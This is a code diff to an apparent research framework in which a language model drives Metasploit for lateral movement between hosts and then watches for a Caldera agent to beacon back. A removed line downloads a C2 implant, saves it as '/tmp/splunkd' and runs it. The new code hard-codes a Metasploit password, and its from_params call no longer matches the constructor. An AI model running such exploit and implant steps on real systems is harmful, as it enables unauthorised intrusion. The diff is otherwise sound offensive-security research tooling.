@@ -5,8 +5,8 @@ from string import Template
 from typing import Any, Dict
 
 from incalmo.core.actions.HighLevel.llm_agents.llm_agent_action import LLMAgentAction
-from .service import MetasploitService
-from incalmo.core.models.events import Event, InfectedNewHost, BashOutputEvent
+from incalmo.core.services.metasploit_service import MetasploitService
+from incalmo.core.models.events import Event, InfectedNewHost
 from incalmo.core.models.network import Host
 from incalmo.core.services import (
     LowLevelActionOrchestrator,
@@ -34,20 +34,22 @@ class LLMLateralMoveMetasploit(LLMAgentAction):
         self,
         source_host: Host,
         target_host: Host,
+        cve_id: str,
+        port_to_attack: int,
         llm_interface: LLMAgentInterface,
-        metasploit_service: MetasploitService,
     ) -> None:
         self.source_host = source_host
         self.target_host = target_host
-        self.metasploit_service = metasploit_service
+        self.cve_id = cve_id
+        self.port_to_attack = port_to_attack
+        self.metasploit_service = MetasploitService(
+            password="password"
+        )  # Password set in attacker startup file
         self.llm_interface = llm_interface
         self.llm_interface.set_preprompt(self.get_preprompt())
         super().__init__(llm_interface)
 
-
-
-
-
+    # Defunct for now
     @classmethod
     def from_params(
         cls, params: Dict[str, Any], llm_interface: LLMAgentInterface
@@ -60,12 +62,27 @@ class LLMLateralMoveMetasploit(LLMAgentAction):
 
         src_host = ess.network.find_host_by_ip(params["src_host"])
         target_host = ess.network.find_host_by_ip(params["target_host"])
+        cve_id = params["cve_id"]
+        port_to_attack = params["port_to_attack"]
 
-        msf_service = MetasploitService(msf_cfg)
-        msf_service.connect()
+        if msf_cfg:
+            msf_service = MetasploitService(
+                password=msf_cfg.password,
+                server=msf_cfg.host,
+                port=msf_cfg.port,
+                ssl=msf_cfg.ssl,
+            )
+        else:
+            msf_service = MetasploitService(password="")
 
-        return cls(src_host, target_host, llm_interface, msf_service)
-
+        return cls(
+            src_host,
+            target_host,
+            cve_id,
+            port_to_attack,
+            llm_interface,
+            msf_service,
+        )
 
     # Main loop
 
@@ -93,14 +110,7 @@ class LLMLateralMoveMetasploit(LLMAgentAction):
         prior_agents = environment_state_service.get_agents()
         prior_paws = {a.paw for a in prior_agents}
 
-        sandcat_cmd = (
-            f"curl -s -X POST -H 'file:sandcat.go' -H 'platform:linux' "
-            f"{environment_state_service.c2c_server}/file/download > /tmp/splunkd; "
-            f"chmod +x /tmp/splunkd; "
-            f"/tmp/splunkd -server {environment_state_service.c2c_server} -group red &"
-        )
-
-        cur_response = ""
+        cur_response = "Please take your first step"
 
         for _ in range(self.MAX_CONVERSATION_LEN):
             new_msg = self.llm_interface.send_message(cur_response)
@@ -124,95 +134,89 @@ class LLMLateralMoveMetasploit(LLMAgentAction):
                 cur_response = f"Could not parse module JSON: {exc}. Please fix the JSON and try again."
                 continue
 
-            module_type: str = module_spec.get("module_type", "")
-            module_path: str = module_spec.get("module_path", "")
-            options: dict = module_spec.get("options", {})
-            payload: str | None = module_spec.get("payload")
-            payload_options: dict = module_spec.get("payload_options") or {}
-
-            if not module_type or not module_path:
-                cur_response = "module_type and module_path are required fields. Please try again."
-                continue
-
+            module_name: str = module_spec.get("module_name", "")
+            args: dict = module_spec.get("args", {})
 
             # Dispatch to MetasploitService
             try:
-                if module_type == "exploit":
-                    session_id, output = self.metasploit_service.run_exploit_module(
-                        module_path=module_path,
-                        options=options,
-                        payload_path=payload,
-                        payload_options=payload_options,
-                    )
-
-                    if session_id:
-                        # Deploy Caldera sandcat agent through the session
-                        deploy_output = self.metasploit_service.run_command_on_session(
-                            session_id, sandcat_cmd
-                        )
-
-                        # Wait for agent to beacon back to Caldera
-                        await asyncio.sleep(_SANDCAT_BEACON_WAIT)
-
-                        # Detect new Caldera agents on target host
-                        new_event = self._detect_new_agent(
-                            environment_state_service, prior_paws, source_agent
-                        )
-                        if new_event:
-                            events.append(new_event)
-                            break
-
+                if module_name == "search_exploits":
+                    if "cve_id" not in args:
                         cur_response = (
-                            f"Session {session_id} opened but the sandcat agent did not beacon back.\n"
-                            f"Deploy command output: {deploy_output}\n"
-                            "Please try a different approach or payload."
+                            "Missing required argument: cve_id. Please try again."
                         )
-                    else:
-                        cur_response = (
-                            f"Module ran but no session was obtained.\n"
-                            f"Output: {output}\n"
-                            "Please adjust the module or options and try again."
-                        )
-
-                elif module_type == "auxiliary":
-                    output = self.metasploit_service.run_auxiliary_module(
-                        module_path=module_path, options=options
-                    )
-                    cur_response = (
-                        f"Auxiliary module completed.\nOutput:\n{output}\n"
-                        "Use this information to select an exploit module."
-                    )
-
-                elif module_type == "post":
-                    # Requires existing session; tries to find one
-                    sessions = self.metasploit_service.list_sessions()
-                    if not sessions:
-                        cur_response = "No active sessions found. You must obtain a session before running a post module."
                         continue
-                    session_id = next(iter(sessions.keys()))
-                    output = self.metasploit_service.run_post_module(
-                        session_id=session_id,
-                        module_path=module_path,
-                        options=options,
+                    result = self.metasploit_service.search_exploits(
+                        cve_id=args["cve_id"]
                     )
-                    cur_response = (
-                        f"Post module completed on session {session_id}.\nOutput:\n{output}"
+                    cur_response = json.dumps(
+                        [m.model_dump() for m in result],
+                        indent=2,
                     )
 
-                else:
-                    cur_response = (
-                        f"Unknown module_type '{module_type}'. "
-                        "Valid values are: exploit, auxiliary, post."
+                elif module_name == "get_exploit_module_options":
+                    if "module_fullname" not in args:
+                        cur_response = "Missing required argument: module_fullname. Please try again."
+                        continue
+                    result = self.metasploit_service.get_exploit_module_options(
+                        module_fullname=args["module_fullname"]
                     )
+                    cur_response = json.dumps(result.model_dump(), indent=2)
+
+                elif module_name == "get_payload_options":
+                    if "payload_name" not in args:
+                        cur_response = (
+                            "Missing required argument: payload_name. Please try again."
+                        )
+                        continue
+                    result = self.metasploit_service.get_payload_options(
+                        payload_name=args["payload_name"]
+                    )
+                    cur_response = json.dumps(result.model_dump(), indent=2)
+
+                elif module_name == "run_exploit":
+                    required_fields = [
+                        "cve_id",
+                        "exploit_module_fullname",
+                        "exploit_options",
+                        "payload_module_fullname",
+                        "payload_options",
+                    ]
+                    missing = [f for f in required_fields if f not in args]
+                    if missing:
+                        cur_response = (
+                            f"Missing required arguments: {', '.join(missing)}. "
+                            "Please provide all required fields and try again."
+                        )
+                        continue
+
+                    result = self.metasploit_service.run_exploit(
+                        cve_id=args["cve_id"],
+                        exploit_module_fullname=args["exploit_module_fullname"],
+                        exploit_options=args["exploit_options"],
+                        payload_module_fullname=args["payload_module_fullname"],
+                        payload_options=args["payload_options"],
+                    )
+
+                    # Wait for agent to beacon back to Caldera
+                    await asyncio.sleep(_SANDCAT_BEACON_WAIT)
+
+                    # Detect new Caldera agents on target host
+                    new_event = self._detect_new_agent(
+                        environment_state_service, prior_paws, source_agent
+                    )
+                    if new_event:
+                        events.append(new_event)
+                        break
+
+                    cur_response = json.dumps(result.model_dump(), indent=2)
 
             except Exception as exc:  # noqa: BLE001
                 cur_response = (
-                    f"Error while executing module {module_type}/{module_path}: {exc}\n"
+                    f"Error while executing {module_name}: {exc}\n"
                     "Please try a different module or fix the options."
                 )
 
         return events
-
 
     # Helper fns
 
@@ -246,6 +250,7 @@ class LLMLateralMoveMetasploit(LLMAgentAction):
         parameters = {
             "target_host": str(self.target_host),
             "source_host": str(self.source_host),
-            "port": str(self.target_host.open_ports),
+            "cve_id": self.cve_id,
+            "port": str(self.port_to_attack),
         }
         return Template(preprompt).safe_substitute(parameters)
